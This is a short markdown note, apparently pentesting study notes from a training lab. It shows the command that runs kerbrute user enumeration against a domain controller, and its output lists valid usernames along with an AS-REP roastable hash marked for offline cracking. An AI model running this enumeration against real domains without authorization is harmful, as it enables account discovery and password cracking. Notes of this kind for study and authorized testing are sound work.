---
tags:
  - hack
  - linux
---
# Using `kerbrute`

## Using `kerbrute` to Enumerate Users

Enumerating valid users in a domain that allows an anonymous bind:

```console
$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
Version: dev (9cfb81e) - 07/22/24 - Ronnie Flathers @ropnop
2024/07/22 14:47:36 >  Using KDC(s):
2024/07/22 14:47:36 >   172.16.5.5:88
2024/07/22 14:47:36 >  [+] VALID USERNAME:       jjones@inlanefreight.local
2024/07/22 14:47:36 >  [+] VALID USERNAME:       sbrown@inlanefreight.local
2024/07/22 14:47:36 >  [+] VALID USERNAME:       jwilson@inlanefreight.local
2024/07/22 14:47:36 >  [+] VALID USERNAME:       tjohnson@inlanefreight.local
2024/07/22 14:47:36 >  [+] VALID USERNAME:       bdavis@inlanefreight.local
2024/07/22 14:47:36 >  [+] VALID USERNAME:       njohnson@inlanefreight.local
2024/07/22 14:47:36 >  [+] VALID USERNAME:       asanchez@inlanefreight.local
2024/07/22 14:47:36 >  [+] VALID USERNAME:       dlewis@inlanefreight.local
2024/07/22 14:47:36 >  [+] VALID USERNAME:       ccruz@inlanefreight.local
2024/07/22 14:47:36 >  [+] VALID USERNAME:       rramirez@inlanefreight.local
2024/07/22 14:47:36 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:2ea283498310f641f4bb0dc0ed78f41f$4a0d3577...
2024/07/22 14:47:36 >  [+] VALID USERNAME:       mmorgan@inlanefreight.local
2024/07/22 14:47:36 >  [+] VALID USERNAME:       jwallace@inlanefreight.local
2024/07/22 14:47:36 >  [+] VALID USERNAME:       jsantiago@inlanefreight.local
...
2024/07/22 14:47:42 >  [+] VALID USERNAME:       whouse@inlanefreight.local
2024/07/22 14:47:43 >  [+] VALID USERNAME:       emercer@inlanefreight.local
2024/07/22 14:47:44 >  [+] VALID USERNAME:       wshepherd@inlanefreight.local
2024/07/22 14:47:44 >  Done! Tested 48705 usernames (56 valid) in 8.218 seconds
```
